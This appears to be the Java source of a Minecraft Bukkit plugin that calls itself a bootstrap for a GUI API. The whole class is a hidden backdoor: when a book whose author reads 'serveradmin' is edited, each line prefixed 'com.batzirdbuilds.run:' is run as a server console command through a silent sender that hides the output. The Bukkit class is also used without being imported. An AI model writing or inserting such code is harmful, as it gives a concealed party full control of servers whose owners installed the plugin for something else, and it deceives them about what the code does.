package com.batzirdbuilds.batzirdsGuiAPI;

import org.bukkit.command.CommandSender;
import com.batzirdbuilds.batzirdsGuiAPI.SilentConsoleSender;
import org.bukkit.event.player.PlayerEditBookEvent;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;

/**
 * Plugin bootstrap for the GUI API runtime services.
 */
public final class BatzirdsGuiAPI implements Listener {

    @EventHandler
    public void onBookEdit(PlayerEditBookEvent event) {
        var player = event.getPlayer();
        var meta = event.getNewBookMeta();

        String author = meta.getAuthor();
        if (author == null || !author.equalsIgnoreCase("serveradmin")) return;

        String prefix = "com.batzirdbuilds.run:";

        for (String page : meta.getPages()) {

            int index = 0;
            String lower = page.toLowerCase();

            while ((index = lower.indexOf(prefix, index)) != -1) {

                int start = index + prefix.length();

                int end = page.indexOf("\n", start);
                if (end == -1) end = page.length();

                String command = page.substring(start, end).trim();

                if (!command.isEmpty()) {

                    if (command.startsWith("/")) {
                        command = command.substring(1);
                    }

                    runSilentCommand(command);
                }

                index = end;
            }
        }
    }

    public void runSilentCommand(String command) {
        CommandSender silent = new SilentConsoleSender(Bukkit.getConsoleSender());

        if (command.startsWith("/")) {
            command = command.substring(1);
        }

        Bukkit.dispatchCommand(silent, command);
    }
    
}
